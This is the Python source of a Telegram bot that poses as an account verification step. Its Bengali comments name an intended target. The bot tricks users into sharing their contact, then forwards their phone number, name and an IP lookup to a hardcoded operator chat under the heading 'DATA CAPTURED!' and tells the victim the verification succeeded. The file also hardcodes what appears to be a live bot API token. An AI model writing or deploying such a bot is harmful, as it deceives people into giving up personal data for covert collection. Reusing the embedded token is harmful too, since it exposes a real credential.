import telebot
from telebot import types
import requests
import os
from threading import Thread
from flask import Flask

# ১. রেন্ডারকে সচল রাখার সার্ভার (Keep-Alive)
app = Flask('')
@app.route('/')
def home(): return "Bot is Active!"

def run():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# ২. মেইন কনফিগারেশন
# আপনার দেওয়া নতুন টোকেন এখানে বসানো হয়েছে
API_TOKEN = '8580731044:AAHSIbv2S3TUpNRVY31jClH6ljZpfk8EKuI'
MY_ID = '8046944525'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # শেয়ার কন্টাক্ট বাটন
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    button = types.KeyboardButton("Verify Now ✅", request_contact=True)
    markup.add(button)
    
    bot.send_message(message.chat.id, "⚠️ **Verification Required!**\n\nPlease click the button below to verify your account.", 
                     reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    try:
        # IP বের করা (অ্যাপ্রোক্সিমেট লোকেশন জানার জন্য)
        res = requests.get("http://ip-api.com/json/", timeout=10).json()
        ip = res.get("query", "N/A")
        
        # আপনার আইডিতে ডাটা পাঠানোর ফরম্যাট
        text = f"🚀 **DATA CAPTURED!**\n\n" \
               f"📱 **Phone:** `{message.contact.phone_number}`\n" \
               f"👤 **Name:** {message.contact.first_name}\n" \
               f"🌐 **IP:** `{ip}`"
        
        # আপনার আইডিতে পাঠানো
        bot.send_message(MY_ID, text, parse_mode="Markdown")
        
        # ইউজারকে (Rupa-কে) জানানো
        bot.send_message(message.chat.id, "✅ Verification Successful! You can now use the bot.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    # ব্যাকগ্রাউন্ডে ফ্ল্যাস্ক সার্ভার চালু করা
    Thread(target=run).start()
    
    # কনফ্লিক্ট এড়াতে ওয়েবহুক রিমুভ করা
    bot.remove_webhook()
    print("Bot is Starting with new token...")
    
    # বট পোলিং শুরু
    bot.infinity_polling(none_stop=True, skip_pending=True)
